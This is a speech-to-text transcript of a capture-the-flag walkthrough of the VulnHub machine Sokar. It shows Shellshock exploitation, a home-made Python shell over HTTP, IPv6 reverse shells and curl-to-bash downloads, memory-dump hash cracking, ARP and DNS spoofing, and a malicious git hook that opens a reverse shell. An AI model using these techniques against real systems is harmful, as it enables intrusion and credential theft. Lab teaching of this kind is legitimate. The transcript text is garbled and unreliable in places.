 what's going on YouTube this is IPSec and we doing so good from Vaughn hub that's right we're doing a Vaughn hub machine not hack the box because hack the box didn't retire machine due to fortress and and game this box was created back in 2015 by Rastamouse the same guy that created Rasta Labs just last year which is an amazing lab and I didn't actually do this box in 2015 the whole reason I decided to pick it is because I was looking through born hub for a machine that looked like it would be a good quality one and soon as I saw his name I decided he would not let me down this box has a bunch of vulnerabilities from like 2014 2015 if you can't tell from the word clown and we're also going to be doing a lot of new things to those for instance the firewall evasion technique I'm showing off I haven't really seen anyone else do it's kind of on pen test monkey as a Ford shell and done a different method that requires Apache to have HTTP protocol options unsafe set which you're not really gonna find and I'm also going to be using better cap 2 which is a very new man the middle framework that is frickin amazing so let's just jump in because this is Vaughn hub everything is local we don't know the IP address of SoCo yet so in order to find the IP address I'm gonna run it if config to see my local network device which is eath 0 they would do it net discover - ie0 and while I run that I'm going to go and start up the VM and I don't have many VMware things running on my network so the very first thing that responds as VMware is most likely going to be sokar we can see I have ubiquity action tech more you victory an ASA stack and then a VMware thing pops up almost right after I started up at 172 at 1610 138 this is Sokka so let's do a mask in against this and I'm doing mask in because circa is local to me I'm not going over a VPN like I do in half the box so I can do a I have a lot more throughput to the box so I can do mask in which is going to be very quick so would you - P one to 65,535 to cover all tcp ports then we can do - - rate is equal to 10000 this is gonna be 10,000 packets per second so we should cover the whole tcp range in about seven seconds we do - OG to output incredible format and I would throw this in the I don't have an ADD map directory I'll just say mask scan and then the IP address of so car which is 170 - 1610 138 we can see it running and is that 57% nothing's found yet there we go one port has been found and because I did the output couple format I'm guessing it's not displaying to standard out which is a bit annoying but we'll just look at that output once the scan finishes cat masscan and we can see port 591 is open to give you an idea how fast that was let us run a and map - P - to do all ports we need to - t5 to make this as quick as possible - n to not do DNS to speed it up a little bit and then do one sim to do 1610 138 we have to give n map a little bit of time to get a estimation but I'm guessing probably around 10 to 15 minutes so we see ETA right now at 12 minutes so n map is much lower than mask in but it is much safer to do over a network I guess you can say and also beware with masks in you can crash devices I have taken many switches offline by just sending way too many packets at it at once so we'll make a directory called n map and we'll do n map - P 591 because we know this port is open let's say - SC for default scripts as v4 enumerate versions so a4 output all formats and we'll just put P 591 as the label of the file once we do 1610 138 is the IP address and once this finishes it shouldn't take too long there's only one port we do see it is Apache HTTP D 2 2 1 5 Santos and 2 - 1 5 I believe is Center 6 we can just do a quick Google of RHEL for Red Hat Enterprise Linux httpd versions check out this first result and RHEL is Red Hat Enterprise Linux the reason I'm choosing red head and not centers is because Red Hat is essentially a paid version of centers or centers is the free version of Red Hat I should say and because you pay for Red Hat you get a lot better documentation so that's generally why I searched that and we see Red Hat Enterprise Linux 5 is based off of two two three six two two one five and seven two four six so since we see two to five on Apache I am a two to one five on Apache I'm gonna guess that this is centers six not a huge thing to know but can be helpful if we're trying to mimic things it is going over HTTP so let's go check out what is listening one sent me to 1610 138 Fort 591 and we see a page and this looks like a lot of bash commands we have looks like date netstat maybe you name I Oh stat so let's look at what happens when we go to this page so let's turn a proxy on intercept set to on refresh we see we get slash and then we also do a get on slash CGI bin slash cat and that is what is displaying this page if we looked at the page source we can also see there's an iframe slash CGI bin slash cat and that is why we go into the page so let's just check out slash CGI bin slash cat and we just go to a CGI script the very first thing I do whenever I see a CGI script is test out shell-shocked because nine times out of ten in a CTF if you're doing a CGI it is gonna be shell-shocked and if you want to know more about shell-shocked just search apes X shell-shocked on YouTube and I'm sure if videos will come up if they don't check out beep that's the one I know and I think shocker I also do shell shock on so let's intercept this request just to make a life easy instead of going to the history tab we can send this to repeater and let's see if I can do this off memory let's see user agent we're going to want to do open and close parentheses and curly brace colon semicolon then we need to echo a content type text HTML then we need an echo then we can echo vulnerable if we see vulnerable we know it is vulnerable to shell shock and we do see it being vulnerable wonder if that I screwed up there I don't know but we got code execution if we do a host name this probably will not execute actually it doesn't because host name isn't part of bash and we don't have a path yet so if we do echo path we get nothing and the reason I uh echo works if we do help and look at all the commands built-in to bash I think echo is one of them yes echo is right here so we don't need a path thrown at Doe we could run any of these commands like even test source times whatever so any of these commands we should be able to run if we want to fix her path let's just echo path on a cow a box let's get rid of that line break we can export path is equal to path then do hostname and now we just get Sokka so now we have the path defined so we can run anything we want so we could try to do a reverse shell so let's do NC 172 1610 I am 168 over let's say port 80 and we don't get any response back so it looks like there is a firewall blocking us so what we can do is create a little Python script to execute shellshock can give us a nice little shell so that's we're gonna do I'm gonna make a directory called code just stay organized and we'll do HTTP well go are chock so what we'll have to do is import requests and what else do we need to import I'm gonna import I think all we need is a request so in order for this to work we need to set a header so we'll set headers is equal to user - agent and then shellshock so let's and we'll have everything static coded first just to make sure it works and then we will add it so we can run commit any command we want that should be good okay and then we need to run a request so request dot get HTTP 172 1610 1:38 /gg I been slash cat and that and we also have to do headers is equal to headers and we want dot text we also want to print this want to print the response so we'll see if this works and this is Python 3 and maybe not doesn't look like it's going so let's see let's add timeout is equal to 5 Oh put 591 and there we go we have a Python script that does shellshock but it's not only that beneficial because well we're not executing any commands so let's create a loop and this can be a infinite loop so it'll go until we kill the program let's put headers into that loop oh man this is all messed up okay that should be fine and headers we need to say percent s for string and this variable will be called CMD and then we'll do CMD is equal to input and we use that as to trigger okay and let's see if this works Python shocker Python three Shaka LS cat Who am I Apache hello Stesha la so we do have a nice shell let us just add a strip to the end of this so we get rid of that annoying line break and what is it screwed something up text let's see that doesn't look right but it is right okay so we do have everything working it looks like there is a file that was weird PWD gives me a lot of stuff I don't know that's happening LS u WD weird so we're in verb dub dub cgi-bin and I guess PWD just doesn't kill the Apache requests and this is what's on CGI bin so let's yeah that's what's happening I won't if I do PWD echo I don't know why some commands break the page and some don't so like OS it only returns cat so we can go back into a repeater tab and hostname I'll enter on Sokka but PWD returns the PWD then content type X text HTML I don't think that's ours don't change bro so we'll see if content type changes if it doesn't this is part of the server so yeah Earth script is right up here content type equals don't change me bro and then we have the output of a script and then the server goes so something weird is going on when we execute OS that breaks output from the server and for some reason PWD doesn't not sure why but the one annoying thing about the shell is every single request is a new request so we're in verb dub CGI been if I do see DW again I'm back there every single request is showing up a new shell so I'm gonna do something to fix that and this is something I figured out doing sans net words because a lot of people in that during the attack and defend set up firewalls to block same packets out so it's really HUD dorver shell so this trick gets around that and you can do a full shell over HTTP that is persistent and keeps all your commands and you also can make yourself have a TTY so you can do at kernel exploits and things like that so this is a really cool trick that I haven't really seen anyone else pull off so to start this off I'm gonna explain exactly what's happening it's a lot like this pen test monkey thing so if we do pen test monkey reverse shell this is how I had figured it out let's see and we think about how this is working it's just creating a named pipe to accept commands and then piping commands into the name pipe and then doing an output to a netcat socket instead we're just gonna output to a actual file and then read the file and write to another file sounds complicated but we'll do this real quick and maybe it'll make sense so I'm gonna do m'kay FIO to make make FIFO to do a named pipe at least I think that's a terminology and then we can do slash temp I what do temp input to make a bit easier so we have a named pipe for a temp input then we're going to do tail - f on temp input and say for every line send that over to Ben SH direct standard error to standard out and then output the results to slash temp output super simple right and it's gonna hang my terminal but we can just I want to this pane so if we cat slash tempt output we don't see anything if we echo who am i into temp input and then cat temp output we see the results of the command we can echo PWD and a temp input cat temp output we see my directory and the cool thing is my echo CD dot dot and cat output let's just do CD root documents Vaughn hub soca see if that works and then we will echo PWD and then cat output so there we are we actually did make a change directory and it saved which is super awesome and then if you really wanted to we could do let's see if I can get this right the first time Python - see think import PTY PTY not spawn then Sh it's always a pain to work with all these quotes cat temp l and now we just see that one hash and that's because we have executed bin SH and we have a TTY in that session so if we did I should show this before but now if we do pass WD to temp input and then cat town output we have any new UNIX password and we can actually change the password but I don't feel like doing that and telling you all my root password so let us just kill this off psdf grep temp in kill - 960 507 and they killed the pain and everything else so that is what we're going to be doing and I can remove this files temp and put output so let's go back into a code and we'll copy Shaka - shocker TTY PI and this is what's going to get a little bit complicated so Shaka TTY PI and we're going to create actual functions to do everything so define run CMD this is going to run a command CMD and we will set headers sequel that CMD C I'm going to import a few things real quick when import time we're going to input from base64 import be 64 encode going to import let's see what do from random input Rand range and then one thing I always do when I do these things is from I python core debugger import tracer and we'll set breakpoint is equal to tracer and what this does it's actually really cool and I can just do breakpoint now and call this and then when I run the script and it gets to that part of the code it should drop me into a show let's see oh it's probably waiting for my input oh I'm not sure exactly what's hanging up I don't think it likes that while true loop for maybe I should have done this I may just take long to run we'll give it a few seconds no there we go so when I do let's say we were on LS I dropped into IP DB which is the Python debugger it tells me where I'm at so if I wanted to I could say print headers and start examining the code so that is a super helpful thing well true one two three four do this this up here kill the breakpoint and until I need that we'll leave that commented out so one thing I am going to do because sending things to files and all that stuff I like to make sure everything is base64 encoded because I don't feel like dealing with random issues with quotes and whatnot so let's see after echo path we can do echo % s base64 dash D and pipe that Sh so all we're doing is echoing the base64 we send through the HTTP request decoding it and then sending it over to SH to be executed then we can have resort is equal to this quest have an extra apprenticea I think no that was the right number Oh was it because that two mates that yep and then we can return result so let's just test this out real quick so run CMD who we have my oh we need a basics if you want go this that's what I'm for did be 64 in code so let's say run CMD Who am I then up here we can have CMD equals CMD in code we have to put this into a utf-8 format and then we can do CMB equals B 64 encode CMD should be right think I'm missing something oh we have to decode it from UTF when we pass to bash I hate how Python 3 makes us do everything in binary format let me show you what happens if we don't do this utf-8 stuff so this probably get an error so bite like object is required not straying and we're airing on line 9 in run command if we do : 9 we can see this is the line so if I have this encoded I can do that base64 and then we could move the encoding so it's just ascii text which makes it friendliness and throughput so Python shaaka tty LS who we're not in Python 3 that's why that aired when I did just input it's expecting Python commands and Python - but if place on three input is not like that so we didn't get any response back because I am not printing the results of this so print run CMD I have dark text rip there so we just need run CMD Who am I there we go so back to having same thing we were just we have this function and this is going to help because now we can create a few things so we can do another one called setup show and we can say STD in and sed out and we do this we have to define a few variables so this is where we want random so are we already imported from random import land range so let's set up a few things session is equal to R and range will say 1000 to 9999 and we also need a set to things not the smartest thing to do but I don't feel like passing these two variables every single time so let's just get rid of that in setup shell so doing this global command lets us just refer to standard in and out in these functions when they're not in the functions because these are going to be static variables never changing so dev s hm that's the ramdisk input dot % s and this can be session do the same thing for out and the reason I did random numbers at the end of this is because I assume I'm gonna run the script multiple times and funky things happen when the files already exist you don't delete them so I like just picking a random one and this should be enough where we don't have repeats so setup shell we can now start doing and say named pipes is equal to and I'm just going to do three quotes because when we do this I can show quick place on three we can say print and then do three coats quotes echo a single quote this and just do a bunch of RAM special characters do another three quotes and we can see we'd have to worry about escaping anything so that's why I have there's three quotes there we will say this is going to be MK fi fo any % s then we tale - F % s then H 2 and 1/2 percent s again we don't need this semicolon at the end of that and let's define there's % asses so standard n we make the file we've tailed the file at standard in as well and then we have standard out so the next thing we do is we're going to do run CMD and the command we want to run is named pipes and [Music] I don't think we have to do anything else here so we can just return none and then let's see we also need another command that will be called def write CMD and let's just copy this so that looks like six lines seven lines whoops and change this a little bit so instead of going over to SH we just want to write this into percent s which will be sed out okay and then we can define I guess a read command because we have to read the output so so be pretty much the same exact thing as named pipes except command is going to be read we can just call this I think I've used output before output and this will be been cat on present s and % s is going to be standard out run command will call this get output and this will return output I think that maybe it trying to think what we're doing wrong yeah let's run this and see if we can figure out if it works oh well true print run command so we have to do a few things here we have to say setup she'll call that now we can do while true CMD is input and we can say write CMD CMD + backslash n to add a line break and then after that runs we can print what is it read command and hope for the best I guess there's no way it's gonna work first try never does what did I screw up request timed out port 5 9000 this MK FIO never actually finishes so we can do try and accept none take five seconds for that to timeout and then we should get this prompt and let's do first name i recommand missing one thing requires CMD shouldn't because all we're doing is counting a static file give it five seconds notice name just at good host name I think I screwed up when I'm writing to so am i yeah that's a funny blog let's see so yeah in his input stand outs they're set up she'll write command and then we're printing read read is getting standard out run command was very command writing till recommend is raining to stand it out that shouldn't be there stand it in thank let's see echo that's CMD and that is what's going to know that should be stands out no right command is standard in oh sure with my god first name there we go so now if we do PWD we get for dub dub dub cgi-bin CD dot dot PWD web dub because we're not clearing out the file after each time we're getting a bunch of history every time we run a command so let us fix that so we can do we have read/write we have a run command so let's see let's just say clear output is equal to let go nothing to standard out and we can do run CMD standard out and that may fix the issue we were having give this five seconds PWD okay CDR PWD did not fix it let's see oh we're on command standard app that makes no sense clear output it is heard to talk in code at the same time we're talking to anything should really take that time out a bit lower LS typo clear here's the typo if you can't tell there's gonna be a very long video because after this I want to do something else and we cleared the output at the wrong spot we cleared it before reading it there we go and we have a shell and we do PWD cgi-bin now I'm for a dub dub dub so we're in a really good spot right now we can do if config get the output of that if we try Python see I don't think this is gonna work and poor Petey ypt why not spawn band bash we'll see if it does LS oh it does sweet so we see the bash prompt OS and the bash prompt again but that's just because of how the Python TTY works but now we could do let's say fast OBD I would do ask you - they're gonna prompt us for password so we're only reading once so let us fix this and this is where the code is gonna get really tricky it's gonna get tricky because when do threading and python because the issue is we've run the command and we only check output once I want to check output every single second so in or do that we have to create a thread that runs the background and just checks it every single second so I'm going to know that we have to import threading and I just said that a lot in order to do that way too much so I'll try to calm down that and we're to create a class so we do class all the reads I'll pass it an object and we'll say when it initializes double equals one that's semicolon interval then we need to say thread is equal to threading dot thread yep then we can say thread' daemon is true this is what puts it in the background and thread dot start okay so all we're doing here this passing an object just means what I call all the threads I could say hey interval equals four and then that will change this variable and then self dot interval equals interval interval is just getting defined within this class and that is gonna be the number of seconds we call read then this is just defining the thread this runs if they're in the background and this says hey when the threads initializes start then we can say define run because why it defines write appear I said hey threading is equal to self dot run so self is this class and then I'm defining run and we want to do let's see where's Ritu command when I grab this and paste it here okay and then let's call read output I don't know if I actually have to put this here because I already did it in one spot but what do it here to be safe so we need to both be able to read and clear the output while true and we can say output is equal to run CMD read output and if output this is saying if output is not nothing then and nothing means there's like it's blank run CMD clear output and we can print output then tell this to go to sleep for interval we don't have to say self dot interval we'll see if it airs out and then these are definitions so in order to start this we can just do what do it after setup shell how do I start it what I call it all the reeds so we'll just call this reading of the things is equal to all the reads loop read STD file and we can get rid of this get rid of this say time dot sleep and we'll say one point one hopefully this works I made a lot of code changes so I don't expect it to first time come on OS oh it does find slash yep it does so now when we do python - c and PTY p2 why not spawn and bash we do what was it try to su and it asked me for the password I can put anything and it's not gonna let me in so now I have a real TTY I can't do tab autocomplete and that stuff if I really wanted to I could do things like import read line and fix it that way but for now I am perfectly happy with how my script is working so I actually didn't want that TTY so will kill the code run it again and I just didn't want it because I don't like having that bash thing we could have something filter it echoing itself out but now I feel like doing that right now I'll leave that for you guys so well on the box and what I want to do is see exactly why my reverse shell didn't work because there should be a firewall rule and unfortunately I'm Apache so I don't have permission to enumerate the firewall but we can go to Etsy sis configure think an LS grap IP table there we go and see the files so if week at IP tables we to get no response and that's because we just don't have mission tree it's someone dude LS dash L a grep for IP tables to prove that and we do have root owns it and it's readwrite only by root the one thing we want to check is LS dash L a grep on tables because there's also IP six tables and we can't read to that either but there's something here if you can spot it real quick that'll be awesome but if not the thing I notice is IP 6 tables was written on November 12th and IP tables rows written on January 2nd so IP 6 tables as much older 2014 and 2015 so it doesn't look like this was configured it also goes on to say the last version of IP 6 tables I'd be six tables not old 41 and the current size is 41 as the same exact date so I really don't I P six tables was configured and when we look at I P tables we have IP tables at old at November 12th and then IP tables at January 2nd so chances are we can probably use IP version 6 to get off this box and I would highly recommend looking at the sneaky video if you want to learn more about ipv6 because I do probably a 15 to 20 minute boot camp of ipv6 for pentesters in that video so let's do neck ifconfig and CL vnp will do 80 again and here we will do one if it has a - 6 option I don't know if it does we'll find out we have to do if come Figg it is e0 so NC copy my fe80 address because it's a link-local i'll have to specify % easier to tell this to go out interface Eve 0 and then we'll do 80 I'm pretty sure it's - 6 for ipv6 but we'll find out don't get anything so let's go here I didn't mean to kill that and see - eh huh I thought there was a - 6 see show commands what if I can't get torn on port 80 I should test this out there's an interface - I I do MC - H here do we have an see we do have MC local port let's test out cool cool HTTP laughs e8e address is zero and we don't get to it let's copy this paste code doesn't like that in ipv6 let's try that cat and c80 - six and valid option yes h see anything there six okay and cat has a six option so if we do and cat6 next refused let's change this to and cat - 600 v @p 80 okay so n cat version 6 is working let's listen on 80 then we can do cool HTTP it's too cold here curl 0 what does it era oh I was treating these semicolons as ports so let's put the address and brackets due till it's ipv6 and I just create a new paint whoops okay so we got ipv6 working that was a bit more pain than I thought it would be so now we can do do we event cap which end cap we do not echo test to dev TCP copy this eighty hey it works so we have a way to get a reverse shell if I just remembered how to do this one that would be awesome and we just pipe bash - that fast - I pipe no let's go to pen test monkey again that is one of the very first ones - - I so that's then and paste was at zero and one yep see if this works and we get a shell here so there is a way to get a reverse shell through ipv6 if you wanted to and we can also scan it over ipv6 but I don't believe SSH is listening at all so let's do a map - six do - p22 because that's the port we'd want see if we can SSH to it and it is closed so let's see what else can we do we've enumerated the which we'll call it firewall I guess the next step is a privacy so oh happy v6 is actually gonna be really helpful here because we're gonna be downloading files and we can't download files over ipv4 but we can download over ipv6 so awesome CD was it Linux you know there we go one a Python shell simple HTTP service supports ipv6 guess we'll find out we want to curl HTTP Lin enum SH and pipe that to bash and really hope for the best here I don't know if that listens oh we don't have port 80 copy and paste this see if this ends up running didn't get any hits let's see cool that's not pipes that fail to connect what a tea refused so Python simple HTTP server is not ipv6 capable maybe wonder if I specify move back please specify this I should prepare more for ipv6 for this box I do as much prep as I should have I guess oh well I bet Python 3 is gonna save us pip3 install that how we get this wait I'm overthinking something service httpd start apache to start for a double-double let's clear that okay so what can we do we're going to copy up when x probe ask wife to lady now I'm gonna Sh stuff yeah I have a dumb in Linux print underscore I've asked that's funny so now can we call this and we can awesome copy/paste and it didn't come back - of our log patchy access let's try this again let's just copy my exact curl command and hit us let's renew a shell just in case we did something to kill it this version of coal doesn't have ipv6 support that's where we hit it six tables - Oh nothing's blocking at that cat LV NP - 681 try this curl again on port 81 just to make sure it works okay I don't think Kyle has ipv6 so let us just get Rover shell and get a normal reverse shell and copy and paste with VI so get rid of my Python TTY by just going to this and we can change that to port 81 did not change 2.81 I don't think change to point 181 get the Rachelle now Python C and put PT y PT y not spawn and bash and we're back in a much more familiar territory so we can also do st 2y raw - echo for ground and now we'll speed up a lot so ok let's go to op um a 64 any number SH is it - W 0 for wrapping it is that is a big script if I just pipe that to X clip X clip - clip would what is it next clip - H s clip - selection clip would okay so now that should be in my clip wood we can go back to a nut cat to have SH M we can see all the files we've created but them when UNAM dot txt sh be 64 VI when a nam SHP 64 thought it was my clip wood there we go a 64 - d Lenna nom nom nom sh and run it okay so let's take a look at what we have Colonel Center 64 so we're right it is Center 6 I have a few users logged on route by now Apophis huh I think there's a Stargate box that's see passwd more users home directories con jobs look normal that looks normal TCP we can see over shell UDP 68 something's listening I forgot report 68 UDP is let's see all this process we don't care about D H client cron HTTP bunch of a reverse shells when enum it's don't Apache files I wonder we can write to ver dub dub dub like me easy way to excel stuff occasions fig files and wonderful things in mail so I went there just because I saw 777 at the end look at this and we have finer is read write read write read so we can look into fighters male subject dear beta welcome to circa Inc friends development team we created you a user password is fruity should require even granted outbound on a ephemeral port access five one two four two so if we didn't have a reverse shell we could su as binder and probably call back to a machine on this point so if we do first let's just test something we can get rid of that show and CLV NP 5 1 2 4 - su - minor fruit I don't want to do that yet bad password exit so we Apache NC 172 1610 168 5 1 2 4 2 we can see I cannot get there as the apache user and see once they do 1610 168 5 1 2 4 2 we can get there as minor so iptables is configured in a way to be dependent upon the actual user which is pretty cool so we see we're in a group called forensics and if we look at our home directory we have something called lime which is a Linux memory thing it's owned by root if we do sudo - L we see that Byner may be able to run the commands and appear these are environment variables that will get passed during a sudo I believe let's see environment keep oh let's see colors display her his name his size I mean just try Hearst name so it's saying it's keeping there's environment variables so if we say sudo home find a lime execute the program but if we set shell shock to any of those variables will do hostname is equal to then Sh that should do it let's see ID and marut box has been done now that is a shortcut but if we want to do this the correct way it will be executing lime and we can look at what lime is I think this is just a bash wrapper yeah behind running this so we're going to let's see the next memory extractor we're going to be copying something to temp Ram and then removing it so let's run this let's see nope sudo home by the lime add or remove we want to add if we go to now attempt there is a ram file we tu - hm it is 256 Meg's we can do strings on it and eventually we get some interesting information so let's do strings and grep for dollar zero six dollar and we get some entries out of shadow it looks like potentially we got some hashes here a lot of duplicate hashes there's one and there is two and this one looks a little bit long do we have any other that's like zem we do not one of that ends at that period see I want there's a better way to do this oh we can cat users FC swd grep - a apo pho yes tap ram anything else this one looks more problem saying because we got the start and end okay here this is Shah Fight Club I believe that was six and let's prep for route I do route semicolon or Cola not semicolon X in quotes guess I think it's this let's see if this is the same length yep same length so that's the route and that's the purpose have you say his name okay so now the next step is go to the Kraken do that this window hash cat is [Music] right there sweet we want to do hashes and we'll call this Sokka okay then we just want to run hash cap help scrap - i sha-512 crypt there we go mode 1800 and if you don't know what hash you are I would highly recommend googling hash cat example hashes and then on this page you have what it looks like in the example which is really helpful because let's see Cisco aasa and pics are very similar and one of these requires username I think that is part of the username or something but seeing these small things on how the hash cut expects it is tremendously helpful so here's a rashon 512 crypt and it's dollar $6 so hash cat 1800 word list comes first then not worthless hash list comes first then word list and we're just do rock you text it's all 512 so if it's trackable it's probably not gonna be too hard to crack so we won't do any rule sets and while that's going we can find a way to get this to a box so tap Bram so we're sorta what our stats huh Oh dub dub HTML doesn't exist CGI cat cat last cat there's a source okay so it scatting temp stats and that's how it gets data can we write to dub dub dub owned by root only writable by root and same thing for all the directories oh that was fast but cover two out of two I bet one of those is fruity let's see this oh yeah it says four right here so we got overdrive and fruity I didn't grab roots hash I guess but we don't have to worry about copying the file to the web server what I was going to do is copy the RAM disk to the web service so I can try to download it and then maybe use something like volatility or bid walk to see if we can extract anything but it looks like hash cat has everything we need so let's go back to a shell which is this guy and we can probably ask you to what's name su to APO pH is overdrive and we are now a different user so CD filled what's in here that's a file cat build file build it's an elf don't know what that's doing LS - la as a set UID bit set what's this do let's yellow that cloning into mountain secret project could not resolve soca - dev fatal what not so it looks like it tries to do something to resolve so go - dev so if we can't XE house it's not there os - go away that's the hosts only ownable and writable by route LS - la on Etsy resolved and we can see we can write to it and this file is to specify DNS servers so we could just set a name server to a Cali box and then force to resolve but I feel like that's cheating a little bit so what we're going to do is mare in the middle this box because well in the same local subnet both Soaker and my Cali box are bridged so we should be able to man the middle and to do that we're going to use a tool called better cap before we do that we're going to show the old tool ettercap we can see up - a and 172 1610 one is going to this MAC address which is my ubiquity switch I believe if you go back to the very beginning the Biddy oh do a net discover that would probably say ubiquity sorry ubiquity a pfsense I'm guessing ubiquity so we can do let's see header cap - tqm up remote and then the IP address I want to what is it poison once introduced 1610 138 and I do two slashes because this is ipv6 and group two we want to say hey we want to intercept all communication to your gateway so we can see it's automatically pulled the MAC address of Group one which is a County box and group two which is the Gateway and if I do okay again we have an entry for my Cali box and we have an entry for the Gateway so if I had opened up wireshark so I can just open up this way okay well shucks thanks it mark now it's gonna have up three wire sharks and that's gonna be bad come on yep okay so to prove what we're doing I don't think I've promiscuous mode enabled on my V switch so this should be fine I set for ICMP and on Sokka we're gonna ping 8888 and because I'm in the millions connection I should be able to see it operation not permitted we'd have to take down IP tables wait when we do UDP I just never check UDP and see - you ate a 53 I think is DNS UDP TCP port UDP port 53 I don't think that what else [Music] maybe this won't work oh I bet build probably jumps as route and then gets out through the firewall that's why why that works I bet if we do dot slash build we can see the DNS request so if we kill this editor cap OOP - hey this mac address has been resolved let's stop and restart this and we shouldn't see that packing anymore when we do dot slash build yes and we do not because we're not me in the middling but enter cap is old no longer under development and very slow the new hotness is a tool called better cap and we're going to download it install it and hopefully it installs fine better cap to see and I want the Edit cap is Ruby let's see his head of cap Ruby who is better cap one Ruby have a cap file use it Ben oh no that's compiled what better cap - this is the hotness is it better Capcom maybe better captain ninja don't ninja sounds like a hacker domain nope better cap arrghh there we go so we do go get github better caps /of better cap let's see if this works it probably won't should go over to the dock and let's see precompiled version is available let's see still thinking we need lid pcap dev and lib netfilter queue dev so we'll see if we have those no package lib that q filter found so we'll apt install this package box is around 8 but I will pause this video and we will resume once this has been completely installed so Lib net Q filter has been installed let us try to do this go get again and I think it installed let's see root go pin better cap hey it did install sweet so no output if it installs let us run that again and this is an actual console if we type help we can see everything there we can turn event stream off if we don't want to keep seeing those of streams come across surprised I'm not saying more but anyways we can see all the options it has by default the two we will want to use is up dot spoof and probably let's see DNS spoof DHCP 6 dot spoof is another really good one but we're just gonna focus on up and DNS so to look at this we can do help up dot spoof and we know we can set targets and whatnot I'm gonna get rid of that event stream real quick so we just do event start stream off and now we won't get these updates anymore so let's set up dot spoof targets so if you do help again you can see the commands you can set you can read you can get so we want to do set on up dot spoof targets so dart spoof targets and then default is the entire subnet we're gonna just do one machine so 172 16 10 138 and then we can do up dot spoof on and then if we go over to a box up - a hopefully we will spoof this guy if config eats 0 my Mac ends in FAA for oh it's already done so we run that dot slash build again haven't changed mark let's see that's probably yeah so we can do and IP source is equal to 170 216 10 138 I think that's this guy run build yes and we see the DNS requests go through so if we want those to go to a Cali box what do you think we do we just go to help DNS spoof we can spoof domains and addresses so let's go back here it wants to resolve sir Gurudev so we're going to do set DNS spoof domains Serco dev and then we can set DNS spoof address to be ourselves when to 1610 and 168 we could probably leave it to default and it would probably someone have to choose 0 but I don't like leaving to default so then we can do DNS spoof on we can set event streams on as well to see what's going on event starts dream on if we do help we see up dot spoof DNS poof and net recon or running we could also just type active and it shows only the active things so we have event stream active then up spoof target is active and we can see the actual arguments or config so if we go back here we can do let's look at Wireshark real quick at this DNS request we see see the source and destination 488 let's see what happens when we run that again build yes source and destination is still there maybe it's just read writing on the way back try paying circa dev on host wonder how we clear our cache or a DNS cache so I'm guessing it's cached right now because that should have spoofed it let's just set DNS spoof all to true I think I speak capital why does exist could still cannot resolve the hostname let's see this should be working oak - a it is definitely set that way Oh let's see anything we can do is s trace on the box it is not object is let's do strings on the binary strings build G lib see nothing there I'm gonna pause the video and we will wait like five minutes to see if it's a cash issue so let's test this again and see what happens not strings I want dot slash build yes and still cannot resolve that hostname so something is going on that is preventing editor cap from setting this poofed request let's do hope real quick let's prove in DNS proof is running events stream start was it on I think it's on sending spoof DNS reply for so good dev to me also be weird because I'm doing this and VMs on bridge networks sounds right let's just exit and redo this set host we've target 138 okay help DNS spoof set DNS poof all too true we'll leave it on interface default let's set DNS boot spoof on set up spoof on active not set up spoof on and DNS spoof on does it work now this is what I get for not testing better cap first should work but it doesn't oh wait cannot connect to on 4/20 oh my freaking God service shd start it worked one time because we see this connector host on port 22 connection refused and now we're getting named a service not known so it just doesn't work all the time I'm guessing there's some timing thing but we have it working and something happen to my TTY Python C and PT y PT why not spawn and see I think I typed that wrong crap well ctrl C one more time X term 256 man let's see Python see if this works we don't want to get a shell again there we go thank God that has been repaired so it looks like for some reason the DNS poof just isn't happening 100% of the time but it is happening so that is good we can search point forget to see if there's any exploits and this get command injection and Metasploit let's see see what version of get is running get - - version 2 to zero so potentially that Metasploit module but I'd like to avoid Metasploit if we can get stack let's see get 2.20 exploit good this sounds good it's been found and get to two to zero has been classified as critical let's check out look at what this is ability that's testing it exploiting there's a cvs cvs on to this there is 2014 9 3 9l see more abilities this is the Metasploit again I'm not try adding like P or C and we have one I think B or C for CVE 2014 9390 met tags I don't think that's POC this was a good write-up they'll and see details can be found here see if we can see an attack and craft a malicious get tree that would cause get to override its own get config when cloning are checking out repository get clients running OSX HFS or any version of an TF is a fat exploitable through this vulnerability Linux are not affected because it is a case sensitive file system however if we look at this let's see it's cloning into /mnt which is melt we look at that it is melted via let's see no I'm proc here we go V fat so mount is not a case sensitive filesystem we could do touch we actually go into no touch a touch lower case a and only one exists FLE echo test into capital A and then cat lowercase a we see it because again V fat is not a case sensitive thing so that's why the vulnerability is existing on Linux and we have this page that just tells us how to do it so see later trying to skim this fast and probably missing things let's just go and do it I think I can beat this together so we have to do this on a root box and we will have to do this probably in /root then we have to make the directories so make 2 - P so we can make multiple directories at the same time so you could project slash dot get hooks CD secret project I want to do a get knit and we want to get ad then we can do CD capital get hooks the post check out and Sh we want to execute a reverse shell is every to 1610 168 and just in case the first shell doesn't work I'm gonna add a sticky bit to VI because I think I can prove ask from that that looks good get add post check out sod unable to add and one of this version of it just doesn't let you do the exploit let's go back to soaker and do pretty much the same exact things so go to our home directory make two - P secret project slash dot get hooks CD in there get an it okay we got two different gets and the reason why we can't do this in the slash mount is because it doesn't care about casing what we want to do is create a dot get with a lowercase G because this is going to be needed to pull the file if we don't have this directory and its capital G when it goes to pull the file it's gonna say it doesn't exist but we're gonna have the config also say hey I had this file with the capital G which Windows takes as the same thing so after we do the exploit I can walk through it real quick and we can hopefully you can understand it what's going on so we just did the get an it so let's V to the capital one hooks post checkout and let's copy what I have here okay we should we go to get add and add everything oh we forgot to chmod it small plus X dot get hooks first check out then get commit sham initial changed and we can see we added the file dot get with a capital G now we have to do is get this file to our host box so we can do tar - tjvf secret project easy - and then the directory so zip it up and then base64 oh it's the file take your project top easy to next step is to copy it and I don't know what I just did oh I changed paid one highlight everything go back to a roof box we'll move everything with secret project and then we can them secret project B Z to be 64 paste okay then we can base 64 - D 2 x JV f to extract ok then go down here run build we should back at LV NP 8080 already listening that's not good burp proxy options off that's why you never use port 8080 yes password they got mistyped it's song see if it gets it started pulling it down wonder if I mistyped my IP address once every to 1610 168 it could also be the port it can't get to control see let's go to mount secret project get hooks post check out does exist and it is executable 172 1610 168 correct IP I don't know what happened there let's look at VI we do have a set UID bit on VI so we can just do bin VI and SH and that did not work I thought it would have and bash oh I guess is not taking advantage of that set UID bit that's a shame so we'll have to redo our exploit see I wonder if we can just edit it get hooks then post checkout chmod all sevens on Etsy passwd and we'll just say port 80 on that get commit dash cam fixed alright looks like it does let us do that so let's see back at lv n P 80 already in use what am i using it for Oh that reverse shell crap them not get hooks all say 4 4 3 still no shell I should just do ipv6 I don't know why I'm not we know that'll get out - la that's the passwd it's all writable anyways so we can change route Pat alright I wanted shadow this is the last time we have to do this third time is the charm can't make a mistake anymore made them all that's the shadow 